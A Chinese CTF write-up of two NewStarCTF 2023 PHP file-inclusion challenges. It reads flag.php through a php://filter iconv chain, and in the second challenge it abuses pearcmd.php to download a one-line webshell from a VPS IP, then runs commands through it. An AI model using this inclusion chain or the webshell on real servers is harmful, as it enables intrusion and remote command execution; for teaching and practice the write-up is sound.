## [NewStarCTF 2023 公开赛道]include 0。0

```php
 <?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?> nope
```

代码审计：

我们要找的flag在flag.php，这是一道文件包含。

参数file完全由用户输入决定，存在黑名单禁止了`base64`、`rot13`这类常见 `php://filter` 过滤器。



直接访问`?file=flag.php`没有回显，我们需要读取`flag.php` 源码，使用`php://filter` + `convert.iconv`：

```
?file=php://filter/convert.iconv.SJIS*.UCS-4*/resource=flag.php
```

![8637977c-8e2c-4c2c-8546-5a21d4898fda](file:///C:/Users/30352/Pictures/Typedown/8637977c-8e2c-4c2c-8546-5a21d4898fda.png)

---

## [NewStarCTF 2023 公开赛道]Include 🍐

```php
<?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];

        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }

        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```

源码审计：

存在黑名单，禁了`flag|log|session|filter|input|data`。

`include($file.".php")` 有后缀拼接。

注释提示 `phpinfo.php` ，先拿配置。



传`?file=phpinfo`，查看配置:

老规矩，先搜flag，提示检查register_argc_argv。

![e8de6079-799f-4ee3-b519-9b669eae52fa](file:///C:/Users/30352/Pictures/Typedown/e8de6079-799f-4ee3-b519-9b669eae52fa.png)

![9757f40c-52ed-46d7-91e7-49f1fda3af18](file:///C:/Users/30352/Pictures/Typedown/9757f40c-52ed-46d7-91e7-49f1fda3af18.png)

> 1. 什么是 `register_argc_argv`:
>    在平时，PHP 是运行在 Web 服务器上的，用来接收网址里的参数（比如 `?file=xxx`）。而 `argv` 原本是Linux终端里接收命令行参数的。当这个配置设为 `On` 时，意味着在网址里用 `+` 或者 `&` 拼出来的内容，会被 PHP 识别成类似终端里的命令参数。
> 
> 2. pear：
>    `PEAR` 是 PHP 的一个包管理器（类似于 Python 的 pip）。 
>    `pearcmd.php` 是它的命令行入口文件，有 `install` 功能，**从网上下载指定的文件，保存到本地**。
>    比如执行 `pear install -R /tmp http://ip/shell.php`，表示从远程 URL 下载文件，并保存到本地 `/tmp` 目录下，从而**解决“没有上传点”的问题**！



这个题目没有上传点，只有一个文件包含漏洞，在phpinfo里查一下也可知远程包含不可用，本题提示已经很明显了，用pear自行上网下载，靶机肯定是不认识我们的个人电脑的（没有公网IP），这个时候就需要VPS了，我平时一般用的**阿里云的VPS+Xshell（XFTP）**。



```bash
echo '<?php system($_GET[cmd]); ?>' > evil.php  #构造一句话木马
python3 -m http.server 80   #把当前的文件夹变成一个下载网站。端口默认是 80。只要有靶机来访问这个 IP，Python 就会把对应的文件发过去。
```

![37dfc6c3-6d69-41f3-871c-255a41e0057e](file:///C:/Users/30352/Pictures/Typedown/37dfc6c3-6d69-41f3-871c-255a41e0057e.png)

用Bp重发访问（防止浏览器地址栏对+等特殊字符进行处理）：

```
/?file=pearcmd&+install+-R+/tmp+http://47.93.44.15/evil.php
```

![618c7a92-4787-4ca4-bade-7e9a0ae695ff](file:///C:/Users/30352/Pictures/Typedown/618c7a92-4787-4ca4-bade-7e9a0ae695ff.png)

`GET /evil.php` 带 200，就说明我们的目标靶机成功拿到了木马

![0eef8ac8-bb2f-441d-b180-eb8bb1bc8e37](file:///C:/Users/30352/Pictures/Typedown/0eef8ac8-bb2f-441d-b180-eb8bb1bc8e37.png)

> 当我们在pear里面用 `install` 命令时，它以为要下载的是正规的软件安装包（后缀通常是 `.tgz` 的压缩包）。所以像`evil.php`这样的文件传过来，他准备解压就会报错，我们就利用它的报错信息去获得下载文件的绝对地址（"/tmp/tmp/pear/download/evil.php"）



访问：

```
/?file=/tmp/tmp/pear/download/evil&cmd=ls /
```

![4f6e3cd9-c8b7-40fa-b1b7-06509d08899e](file:///C:/Users/30352/Pictures/Typedown/4f6e3cd9-c8b7-40fa-b1b7-06509d08899e.png)

访问：

```
/?file=/tmp/tmp/pear/download/evil&cmd=cat /fla*
```

![651fe803-d336-41d4-a805-9159183b2b29](file:///C:/Users/30352/Pictures/Typedown/651fe803-d336-41d4-a805-9159183b2b29.png)
